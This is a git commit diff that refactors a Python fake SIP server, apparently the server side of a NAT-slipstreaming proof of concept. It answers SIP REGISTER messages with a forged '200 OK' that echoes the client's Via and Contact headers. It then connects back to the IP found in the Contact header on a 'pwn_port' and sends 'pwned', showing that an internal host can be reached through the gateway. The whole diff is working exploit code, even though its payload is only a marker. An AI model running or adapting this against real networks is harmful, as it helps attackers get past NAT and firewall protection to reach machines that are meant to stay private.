6f11189d70428fd467d92fa3a2b1e28916929679
Jacob Malcy <pcx436@yahoo.com>
2021-03-01 13:48:35 -0700

    Moving stuff to main

--- sip-server.py
+++ sip-server.py
@@ -29,50 +29,75 @@ def get_args():
 	return parser.parse_args()
 
 
-while True:
-    con, client = s.accept()
-    print("Connection from", client)
-    done=0
-    
-    incoming_message = ""
+def main(args):
+	# used for finding IPs to match
+	contact_pattern = r'(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)'
 
-    while done < 4: #simple way to detect EOM
-        dataFromClient = con.recv(1)
-        d = dataFromClient.decode()
-        incoming_message += d
-        print(d, end ="")
-        
-        if d == "\n" or d == "\r":
-            done = done + 1 
-        else:
-            done=0    
+	run(args.listen_port, args.pwn_port)
+	s = socket(AF_INET, SOCK_STREAM)
+	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+	s.bind(("", 5060))
+	s.listen()
+	i = 1
 
-    contact = ""
-    via = ""
-    for line in incoming_message.splitlines():
-        if (line.startswith("Contact:")):
-            contact = line
+	while True:
+		con, client = s.accept()
+		print("Connection from", client)
+		done = 0
 
-        if (line.startswith("Via:")):
-            via = line
+		incoming_message = ""
 
-    print("Sending response")
+		while done < 4:  # simple way to detect EOM
+			dataFromClient = con.recv(1)
+			d = dataFromClient.decode()
+			incoming_message += d
+			print(d, end="")
+
+			done = done + 1 if d in "\r\n" else 0
+
+		contact = ""
+		via = ""
+
+		header = '-' * 5 + ' RECEIVED ' + '-' * 5
+
+		print('-' * 5, 'RECEIVED', '-' * 5)
+		print(incoming_message)
+		print('-' * len(header))
+
+		for line in incoming_message.splitlines():
+			if line.startswith("Contact:"):
+				contact = line
+				print('Contact: \"{}\"'.format(contact))
+
+			if line.startswith("Via:"):
+				via = line
+				print('Via: \"{}\"'.format(via))
+
+		print("Sending response #{}".format(i))
+		i += 1
+
+		BODY = "SIP/2.0 200 OK\r\n" + \
+		       via + ";received=0.0.0.0\r\n" + \
+		       "From: <sip:wuzzi@example.org;transport=TCP>;tag=U7c3d519\r\n" + \
+		       "To: <sip:wuzzi@example.org;transport=TCP>;tag=37GkEhwl6\r\n" + \
+		       "Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.\r\n" + \
+		       "CSeq: 1 REGISTER\r\n" + \
+		       contact + ";expires=3600\r\n" + \
+		       "Content-Length: 0\r\n\r\n"
+
+		print(BODY)
+		print('-' * len(header))
+
+		con.send(BODY.encode("ascii"))
+		con_ip = search(contact_pattern, contact).group()
+		s2 = socket(AF_INET, SOCK_STREAM)
+		s2.connect((con_ip, args.pwn_port))
+		s2.send(b'pwned')
+		s2.close()
+
+		con.close()
+		print("Response sent.")
 
 
-    BODY=f"""SIP/2.0 200 OK
-""" + via + """;received=0.0.0.0
-From: <sip:wuzzi@example.org;transport=TCP>;tag=U7c3d519
-To: <sip:wuzzi@example.org;transport=TCP>;tag=37GkEhwl6
-Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.
-CSeq: 1 REGISTER
-""" + contact + """;expires=3600
-Content-Length: 0
-
-
-"""
-
-    BODY = BODY.replace("\n","\r\n")
-    print(BODY)
-    con.send(BODY.encode("ascii"))
-    con.close() 
-    print("Response sent.")
+if __name__ == '__main__':
+	main(get_args())
